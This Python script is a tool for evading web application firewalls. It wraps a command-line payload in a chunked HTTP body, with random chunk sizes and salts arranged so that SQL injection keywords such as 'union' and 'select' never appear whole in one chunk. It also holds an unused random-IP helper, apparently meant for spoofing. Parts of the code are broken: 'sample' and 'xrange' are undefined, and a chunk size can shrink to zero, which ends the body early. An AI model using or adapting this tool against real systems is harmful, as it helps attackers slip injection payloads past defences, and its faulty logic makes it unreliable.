import random
import string
import sys
def randomIP():
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = sample(xrange(1, 255), 4)
    return '.'.join(str(_) for _ in numbers)

def chunk_data(data):
    keywords = ['and', 'union', 'select', 'user', 'from']
    dl = len(data)
    ret = ""
    index = 0
    while index < dl:
        chunk_size = random.randint(1, 9)
        if index + chunk_size >= dl:
            chunk_size = dl - index
        salt = ''.join(random.sample(string.ascii_letters + string.digits, 5))
        while 1:
            tmp_chunk = data[index:index + chunk_size]
            tmp_bool = True
            for k in keywords:
                if k in tmp_chunk:
                    chunk_size -= 1
                    tmp_bool = False
                    break
            if tmp_bool:
                break
        index += chunk_size
        ret += "{0};{1}\r\n".format(hex(chunk_size)[2:], salt)
        ret += "{0}\r\n".format(tmp_chunk)

    ret += "0\r\n\r\n"
    print(ret)
print("Content-Type: application/x-www-form-urlencoded; charset=utf-8")
print("Transfer-Encoding: Chunked")
print()
chunk_data(sys.argv[1])
